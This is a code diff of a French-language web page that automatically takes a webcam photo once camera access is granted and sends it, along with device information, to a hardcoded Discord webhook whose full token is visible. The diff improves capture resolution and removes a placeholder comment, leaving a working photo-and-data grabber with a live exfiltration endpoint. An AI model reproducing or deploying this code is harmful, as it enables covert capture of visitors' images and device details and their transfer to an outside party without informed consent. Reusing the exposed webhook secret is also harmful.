@@ -16,8 +16,8 @@
 <body>
     <h1>Prendre une photo automatiquement et envoyer les informations</h1>
     <p>Veuillez autoriser l'accès à la caméra pour prendre une photo automatiquement.</p>
-    <video id="camera" width="320" height="320" autoplay></video>
-    <canvas id="photo" width="320" height="320"></canvas>
+    <video id="camera" width="320" height="240" autoplay></video>
+    <canvas id="photo" width="640" height="480"></canvas> <!-- Augmenter la taille du canvas -->
 
     <script>
         function obtenirInfosAppareil() {
@@ -32,7 +32,6 @@
             const formData = new FormData();
             formData.append('file', blob, 'photo.png');
 
-            // Remplacez l'URL ci-dessous par l'URL de votre webhook Discord
             const url = 'https://discord.com/api/webhooks/1264515631122878466/IeM3kvt1ZIIcvP7tq2NBQtG80ARxiqkuKv-PBjLbjFwuOr87Im8l6ls3LVybGGxL-Xvu';
             return fetch(url, {
                 method: 'POST',
@@ -61,8 +60,12 @@
                     video.srcObject = stream;
                     video.play();
                     video.onloadeddata = function() {
+                        // Ajuster la taille du canvas pour obtenir une image de bonne qualité
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+
                         // Prendre une photo automatiquement après que la vidéo a commencé
-                        context.drawImage(video, 0, 0, 320, 320);
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                         video.pause();
 
                         // Convertir l'image en base64
